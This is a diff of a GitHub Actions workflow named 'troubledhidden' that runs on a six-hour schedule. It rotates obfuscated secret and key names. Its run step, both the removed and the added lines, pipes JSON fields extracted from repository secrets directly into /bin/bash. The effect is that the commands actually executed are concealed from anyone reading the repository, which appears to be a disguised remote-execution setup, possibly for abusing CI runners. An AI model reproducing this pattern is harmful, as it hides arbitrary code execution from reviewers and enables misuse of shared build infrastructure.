@@ -1,8 +1,9 @@
 name: troubledhidden
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
+    - cron: '44 0/6 * * *'
 
 jobs:
   build:
@@ -11,13 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: troubledhidden
         env:
-          xzt0141: ${{ secrets.xzt0141 }}
+          f58436: ${{ secrets.f58436 }}
         run: |
-          echo $xzt0141 | jq -r .bi98444 | /bin/bash
-          echo $jiwh0182 | jq -r .frk44663 | /bin/bash
-          echo $zbm729 | jq -r .pqfww764 | /bin/bash
-          echo $f365 | jq -r .daca0 | /bin/bash
-          echo $zo1754 | jq -r .je7 | /bin/bash
-          echo $n8 | jq -r .likz60 | /bin/bash
-          echo $ksag4 | jq -r .efect168 | /bin/bash
+          echo $f58436 | jq -r .seyb47871 | /bin/bash
+          echo $vokwz18743 | jq -r .x809 | /bin/bash
+          echo $hcit663 | jq -r .dfa39 | /bin/bash
+          echo $rjja6838 | jq -r .g1878 | /bin/bash
 
